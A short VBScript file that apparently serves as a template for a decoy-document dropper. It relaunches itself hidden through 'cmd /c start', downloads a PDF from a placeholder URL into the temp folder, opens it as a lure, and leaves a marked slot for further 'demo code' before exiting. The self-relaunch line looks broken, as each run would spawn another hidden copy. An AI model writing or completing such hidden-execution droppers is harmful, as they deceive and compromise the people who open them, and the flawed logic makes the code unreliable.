' Self-hiding code
CreateObject("WScript.Shell").Run "cmd /c start " & WScript.ScriptFullName, 0, False

' Download and display a legitimate PDF file as part of your demo
Set http = CreateObject("MSXML2.XMLHTTP")
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Replace with URL to your PDF file
pdfUrl = "https://example.com/document.pdf" 
tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\document.pdf"

' Download PDF
http.open "GET", pdfUrl, False
http.send
If http.Status = 200 Then
    Set stream = fso.CreateTextFile(tempFile, True)
    stream.Write http.responseBody
    stream.Close
    
    ' Open the PDF file
    shell.Run """" & tempFile & """", 1, False
End If

' Add your additional demo code here
' This is where you would put the non-harmful demonstration code

' Self-terminate after short delay
WScript.Sleep 1000
WScript.Quit
